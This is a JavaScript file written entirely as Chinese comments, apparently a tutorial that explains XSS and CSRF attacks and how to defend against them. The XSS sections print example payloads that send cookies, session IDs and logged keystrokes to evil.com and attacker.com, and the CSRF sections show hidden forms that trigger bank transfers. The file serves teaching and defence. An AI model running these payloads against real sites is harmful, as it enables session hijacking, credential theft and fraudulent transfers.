/**
 * XSS与CSRF攻击详解
 * 
 * 本文详细分析两种常见的Web安全攻击：跨站脚本攻击(XSS)和跨站请求伪造(CSRF)，
 * 包括攻击原理、危害、防御措施及实际案例。
 */

/**
 * 一、XSS攻击(Cross-Site Scripting)
 * 
 * XSS是一种代码注入攻击，攻击者将恶意脚本注入到受信任的网站，当用户浏览网站时，
 * 恶意脚本会在用户的浏览器上执行，可能导致信息泄露、会话劫持等安全问题。
 */

/**
 * 1.1 XSS攻击类型
 */

// 1. 反射型XSS (Reflected XSS)
/**
 * 特点：
 * - 恶意代码包含在URL中
 * - 服务器将未经过滤的用户输入反射回浏览器
 * - 需要诱导用户点击恶意链接
 * 
 * 示例攻击链接：
 * https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
 * 
 * 当用户点击这个链接时，如果服务器没有对输入进行适当过滤就将其嵌入到响应中，
 * 浏览器会执行这段脚本，将用户的Cookie发送到攻击者的服务器。
 */

// 2. 存储型XSS (Stored XSS)
/**
 * 特点：
 * - 恶意代码存储在目标服务器的数据库中
 * - 当其他用户浏览包含此恶意代码的页面时受到攻击
 * - 影响范围更广，危害更大
 * 
 * 示例：
 * 论坛帖子中插入：<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
 * 
 * 当其他用户浏览这个帖子时，他们的Cookie会被发送到攻击者的服务器。
 */

// 3. DOM型XSS (DOM-based XSS)
/**
 * 特点：
 * - 漏洞存在于客户端JavaScript代码中
 * - 恶意代码不会发送到服务器
 * - 完全在客户端执行
 * 
 * 示例代码：
 * // 不安全的JavaScript代码
 * document.getElementById("demo").innerHTML = location.hash.substring(1);
 * 
 * // 攻击链接：
 * https://example.com/page.html#<img src="x" onerror="alert(document.cookie)">
 */

/**
 * 1.2 XSS攻击的危害
 */

/**
 * 1. 窃取用户信息：
 *    - Cookie、localStorage和sessionStorage中的数据
 *    - 表单输入内容（如登录凭证）
 *    - 浏览器中的敏感信息
 * 
 * 2. 会话劫持：
 *    - 获取用户的会话标识后冒充用户身份
 *    - 执行未经授权的操作
 * 
 * 3. 网站篡改：
 *    - 修改页面内容和外观
 *    - 插入虚假信息或恶意链接
 * 
 * 4. 键盘记录：
 *    - 记录用户的键盘输入
 *    - 窃取密码和敏感信息
 * 
 * 5. 恶意重定向：
 *    - 将用户重定向到钓鱼网站
 */

/**
 * 1.3 XSS攻击实例代码演示
 */

// 1. 窃取Cookie的XSS攻击
/**
 * // 攻击者注入的恶意代码：
 * <script>
 *   // 将用户Cookie发送到攻击者控制的服务器
 *   var img = new Image();
 *   img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
 * </script>
 */

// 2. 会话劫持演示
/**
 * // 攻击者注入的恶意代码：
 * <script>
 *   // 窃取用户的会话ID
 *   var sessionId = document.cookie.match(/PHPSESSID=([^;]+)/)[1];
 *   // 发送到攻击者的服务器
 *   fetch('https://attacker.com/steal-session?id=' + sessionId);
 * </script>
 */

// 3. 键盘记录器
/**
 * // 攻击者注入的恶意代码：
 * <script>
 *   var keys = '';
 *   document.addEventListener('keypress', function(e) {
 *     keys += e.key;
 *     // 每记录50个字符发送一次
 *     if(keys.length >= 50) {
 *       fetch('https://attacker.com/log?keys=' + encodeURIComponent(keys));
 *       keys = '';
 *     }
 *   });
 * </script>
 */

/**
 * 1.4 XSS防御措施
 */

// 1. 输入验证和过滤
/**
 * // 服务器端验证
 * function sanitizeInput(input) {
 *   // 移除或编码潜在的危险字符
 *   return input.replace(/[<>"'&]/g, function(match) {
 *     return '&#' + match.charCodeAt(0) + ';';
 *   });
 * }
 * 
 * // 使用时：
 * const userInput = req.query.input;
 * const safeInput = sanitizeInput(userInput);
 */

// 2. 输出编码
/**
 * // 在输出到HTML前进行编码
 * function encodeHTML(text) {
 *   return text
 *     .replace(/&/g, '&amp;')
 *     .replace(/</g, '&lt;')
 *     .replace(/>/g, '&gt;')
 *     .replace(/"/g, '&quot;')
 *     .replace(/'/g, '&#039;');
 * }
 * 
 * // 使用时：
 * document.getElementById('output').innerHTML = encodeHTML(userContent);
 */

// 3. 内容安全策略 (CSP)
/**
 * // 在HTTP头中设置CSP
 * Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
 * 
 * // 或在HTML中设置
 * <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted.com">
 */

// 4. 使用现代框架
/**
 * // React自动转义动态内容
 * function SafeComponent() {
 *   const userInput = "<script>alert('XSS')</script>";
 *   return <div>{userInput}</div>; // 会被安全转义
 * }
 * 
 * // 如需插入HTML，必须显式使用dangerouslySetInnerHTML
 * function UnsafeComponent() {
 *   return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
 * }
 */

// 5. Cookie保护
/**
 * // 设置HttpOnly标志防止JavaScript访问Cookie
 * Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
 */

/**
 * 二、CSRF攻击(Cross-Site Request Forgery)
 * 
 * CSRF是一种攻击，强制已登录用户执行未经授权的操作，攻击者通过伪装来自受信任用户的请求，
 * 使用户在不知情的情况下执行恶意操作。
 */

/**
 * 2.1 CSRF攻击原理
 */

/**
 * CSRF攻击的基本步骤：
 * 
 * 1. 用户登录了目标网站A（如银行网站）并获得了认证Cookie
 * 2. 用户在不登出A的情况下，访问了恶意网站B
 * 3. 恶意网站B包含代码，触发对网站A的请求
 * 4. 浏览器自动附加用户在A站的Cookie到请求中
 * 5. A站接收到带有有效认证的请求，执行操作
 * 
 * 关键要素：
 * - 目标网站依赖Cookie等自动发送的认证方式
 * - 请求操作的参数可以预测或不需要特殊信息
 * - 用户已经登录目标网站
 */

/**
 * 2.2 CSRF攻击示例
 */

// 1. GET请求CSRF攻击
/**
 * // 恶意网站中的图片标签
 * <img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none" />
 * 
 * // 当用户访问包含此代码的恶意页面时，浏览器会发送GET请求到bank.com，
 * // 如果用户已登录bank.com，请求会带上用户的Cookie，导致转账操作被执行
 */

// 2. POST请求CSRF攻击
/**
 * // 恶意网站中的自动提交表单
 * <body onload="document.forms[0].submit()">
 *   <form action="https://bank.com/transfer" method="POST">
 *     <input type="hidden" name="to" value="attacker" />
 *     <input type="hidden" name="amount" value="1000" />
 *   </form>
 * </body>
 */

// 3. AJAX请求CSRF（通常会被同源策略阻止）
/**
 * // 由于同源策略的限制，这种攻击通常不会成功，除非目标网站配置了宽松的CORS
 * <script>
 *   fetch('https://bank.com/api/transfer', {
 *     method: 'POST',
 *     body: JSON.stringify({to: 'attacker', amount: 1000}),
 *     credentials: 'include', // 包含Cookie
 *     headers: {'Content-Type': 'application/json'}
 *   });
 * </script>
 */

/**
 * 2.3 CSRF攻击的危害
 */

/**
 * 1. 未授权操作：
 *    - 资金转账
 *    - 更改账户信息（邮箱、密码）
 *    - 购买商品
 *    - 发送消息
 * 
 * 2. 隐蔽性：
 *    - 用户通常不会察觉到攻击
 *    - 操作被记录为用户正常行为
 * 
 * 3. 影响范围：
 *    - 可能影响大量用户
 *    - 对高价值目标（银行、支付系统）危害更大
 */

/**
 * 2.4 CSRF防御措施
 */

// 1. CSRF Token
/**
 * // 服务器端生成Token
 * function generateCSRFToken() {
 *   return crypto.randomBytes(32).toString('hex');
 * }
 * 
 * // 验证Token
 * function validateCSRFToken(req, token) {
 *   return req.session.csrfToken === token;
 * }
 * 
 * // 在表单中包含Token
 * <form action="/transfer" method="post">
 *   <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
 *   <!-- 其他表单域 -->
 * </form>
 */

// 2. Double Submit Cookie
/**
 * // 服务器设置CSRF Cookie
 * Set-Cookie: XSRF-TOKEN=abc123; SameSite=Lax
 * 
 * // 前端JavaScript读取Cookie并附加到请求头
 * const csrfToken = getCookie('XSRF-TOKEN');
 * fetch('/api/transfer', {
 *   method: 'POST',
 *   headers: {
 *     'X-XSRF-TOKEN': csrfToken
 *   },
 *   body: JSON.stringify(data)
 * });
 */

// 3. SameSite Cookie属性
/**
 * // 设置Cookie的SameSite属性
 * Set-Cookie: sessionId=abc123; SameSite=Strict; Secure
 * 
 * // SameSite值:
 * // - Strict: 完全禁止第三方网站发送Cookie
 * // - Lax: 允许导航到目标网址的GET请求带上Cookie（现代浏览器默认值）
 * // - None: 允许跨站请求携带Cookie（需要同时设置Secure）
 */

// 4. 验证Referer/Origin
/**
 * // 服务器端验证Referer或Origin头
 * function checkReferer(req) {
 *   const referer = req.headers.referer || '';
 *   return referer.startsWith('https://mywebsite.com');
 * }
 * 
 * // 使用时：
 * if (!checkReferer(req)) {
 *   return res.status(403).send('Forbidden');
 * }
 */

// 5. 自定义请求头
/**
 * // 使用自定义请求头（只能通过JavaScript添加，而非表单提交）
 * fetch('/api/sensitive-action', {
 *   method: 'POST',
 *   headers: {
 *     'X-Requested-With': 'XMLHttpRequest',
 *     'Content-Type': 'application/json',
 *   },
 *   body: JSON.stringify(data)
 * });
 * 
 * // 服务器验证自定义头
 * if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
 *   return res.status(403).send('Forbidden');
 * }
 */

/**
 * 三、XSS与CSRF的关键区别
 */

/**
 * 1. 攻击目标：
 *    - XSS: 以用户为目标，窃取用户信息或以用户身份执行操作
 *    - CSRF: 以应用为目标，诱导用户执行非预期操作
 * 
 * 2. 攻击方式：
 *    - XSS: 注入恶意脚本到目标网站，利用用户对网站的信任
 *    - CSRF: 利用网站对用户的信任，伪造用户请求
 * 
 * 3. 利用的漏洞：
 *    - XSS: 网站未正确过滤用户输入或输出
 *    - CSRF: 网站仅依赖Cookie验证身份，未验证请求来源
 * 
 * 4. 执行上下文：
 *    - XSS: 恶意代码在用户浏览器的目标网站环境中执行
 *    - CSRF: 恶意请求由用户浏览器发出，但由攻击者的网站触发
 * 
 * 5. 同源策略影响：
 *    - XSS: 绕过同源策略，因为代码在目标网站执行
 *    - CSRF: 受同源策略限制，但利用了请求自动附加Cookie的特性
 */

/**
 * 四、XSS和CSRF结合攻击
 */

/**
 * XSS和CSRF攻击可以结合使用，形成更强大的攻击：
 * 
 * 1. 使用XSS窃取CSRF Token：
 *    - 首先通过XSS注入恶意脚本
 *    - 脚本读取页面中的CSRF Token
 *    - 将Token发送给攻击者
 *    - 攻击者使用有效Token构造CSRF攻击
 * 
 * 2. 使用XSS直接发起内部请求：
 *    - XSS注入的脚本直接从目标网站域发起请求
 *    - 这些请求自动带有用户的Cookie和CSRF Token
 *    - 绕过了大多数CSRF防护
 * 
 * 这种组合攻击强调了同时防范两种攻击的重要性。
 */

/**
 * 五、真实世界的攻击案例
 */

/**
 * 1. XSS案例：Twitter存储型XSS (2010)
 *    - 漏洞允许在鼠标悬停时执行JavaScript
 *    - 利用onMouseOver事件触发
 *    - 影响了数千用户，导致未经授权的推文
 * 
 * 2. CSRF案例：Gmail跨站漏洞 (2007)
 *    - 攻击者可以强制用户更改电子邮件转发设置
 *    - 当用户访问恶意网站时可以劫持其Gmail账户
 *    - Google后来实施了CSRF Token防护
 * 
 * 3. MySpace Samy蠕虫 (2005)
 *    - 结合存储型XSS
 *    - 当用户查看感染页面时自动添加攻击者为好友
 *    - 同时复制蠕虫代码到用户个人资料
 *    - 在24小时内感染了超过一百万用户
 */

/**
 * 六、防护最佳实践
 */

/**
 * 1. 多层防御策略：
 *    - 不要依赖单一防护机制
 *    - 结合多种防护措施
 * 
 * 2. XSS防护：
 *    - 输入验证和输出编码
 *    - 使用Content-Security-Policy
 *    - 采用现代框架的安全功能
 *    - 定期进行安全审计
 * 
 * 3. CSRF防护：
 *    - 实施CSRF Token
 *    - 使用SameSite Cookie
 *    - 验证请求来源
 *    - 关键操作使用re-authentication
 * 
 * 4. 基础安全措施：
 *    - 所有敏感操作使用HTTPS
 *    - 正确配置Cookie属性（Secure, HttpOnly, SameSite）
 *    - 保持框架和库的更新
 *    - 遵循最小权限原则
 * 
 * 5. 用户教育：
 *    - 提醒用户注销不常用的会话
 *    - 警惕可疑链接
 *    - 使用不同站点的不同密码
 *    - 启用多因素认证
 */
